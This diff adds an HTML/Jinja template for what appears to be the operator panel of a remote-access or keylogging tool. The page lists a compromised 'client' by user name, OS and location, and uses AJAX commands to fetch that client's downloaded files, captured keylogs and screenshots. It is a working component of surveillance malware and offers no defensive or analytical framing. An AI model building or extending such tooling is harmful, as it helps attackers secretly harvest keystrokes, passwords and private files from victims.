@@ -1,0 +1,128 @@
+														<!-- offline_client_menu.html -->
+<!-- args:client -->
+{% extends "layout.html" %}
+{% block title %}
+Offline Client Menu
+{% endblock %}
+
+{% block main %}
+
+<div class="card">
+    <div class="card-body">
+        <h2 class="display-4">{{client["user_name"]}} on {{client["os"]}}</h2>
+        <small class="text-muted">Status: <span class="badge badge-danger">Offline</span></small>
+        <p class="lead">From {{client["location"]}}</p>
+        <small class="text-muted">Last Seen: {{ client['last_seen'] }}</small><br>
+        <small class="text-muted">Date Added: {{ client['date_added'] }}</small>
+    </div>
+</div>
+
+<hr class="my-4">
+
+<div class="row">
+
+    <div class="col-3">
+
+        <div class="nav flex-column nav-pills" id="v-pills-tab" role="tablist" aria-orientation="vertical">
+            <a class="nav-link active" id="files" data-toggle="pill" href="#list-files" role="tab" aria-controls="list-files" aria-selected="false">Downloaded Files</a>
+            <a class="nav-link" id="keys" data-toggle="pill" href="#list-keys" role="tab" aria-controls="list-keys" aria-selected="false" onclick="hideFiles();">KeyLogs</a>
+            <a class="nav-link" id="screens" data-toggle="pill" href="#list-screens" role="tab" aria-controls="list-screens" aria-selected="false" onclick="hideFiles();">ScreenShots</a>
+        </div>
+
+    </div>
+    <div class="col-9">
+        <div class="tab-content" id="v-pills-tabContent">
+
+
+            <div class="tab-pane fade" id="list-files" role="tabpanel" aria-labelledby="files">
+
+            </div>
+
+            <div class="tab-pane fade" id="list-keys" role="tabpanel" aria-labelledby="keys">
+
+            </div>
+
+            <div class="tab-pane fade" id="list-screens" role="tabpanel" aria-labelledby="screens">
+
+            </div>
+        </div>
+    </div>
+
+</div>
+<div class="row">
+    <div class="container-fluid">
+        <div class="tab-content" id="nav-tab">
+            <div class="tab-pane fade show" id="list-files-hdd" role="tabpanel"></div>
+        </div>
+    </div>
+</div>
+<hr class="my-4">
+<script type="text/javascript">
+    $('#files').click(function(){
+       var data = JSON.stringify({
+           client:"{{ client['user_name'] }}",
+           cmd:"local_files",
+       });
+    console.log(data);
+    $.ajax({
+
+        type: "POST",
+        url: "{{ url_for('actions') }}",
+        data:data,
+        contentType: 'application/json;charset=UTF-8',
+        beforeSend: function(){
+            $('#list-files').html('<i class="fas fa-spinner fa-spin"></i>');
+        }
+
+    })
+    .done(function(msg){
+       $('#list-files').html(msg);
+    });
+    });
+
+    $('#keys').click(function(){
+        var data = JSON.stringify({
+            client: "{{ client['user_name'] }}",
+            cmd: "local_keylogs",
+        });
+        console.log(data);
+        $.ajax({
+
+            type: "POST",
+            url: "{{ url_for('actions') }}",
+            data: data,
+            contentType: 'application/json;charset=UTF-8',
+            beforeSend: function(){
+                $('#list-keys').html('<i class="fas fa-spinner fa-spin"></i>');
+            }
+        })
+        .done(function(msg){
+           $('#list-keys').html(msg);
+        });
+    });
+
+    $('#screens').click(function(){
+        var data = JSON.stringify({
+            client: "{{ client['user_name'] }}",
+            cmd: "local_screenshots",
+        });
+        console.log(data);
+        $.ajax({
+
+            type: "POST",
+            url: "{{ url_for('actions') }}",
+            data: data,
+            contentType: 'application/json;charset=UTF-8',
+            beforeSend: function(){
+                $('#list-screens').html('<i class="fas fa-spinner fa-spin"></i>');
+            }
+        })
+        .done(function(msg){
+           $('#list-screens').html(msg);
+        });
+    });
+window.document.ready = document.getElementById('keys').click()
+window.document.ready = document.getElementById('files').click()
+</script>
+
+{% endblock %}
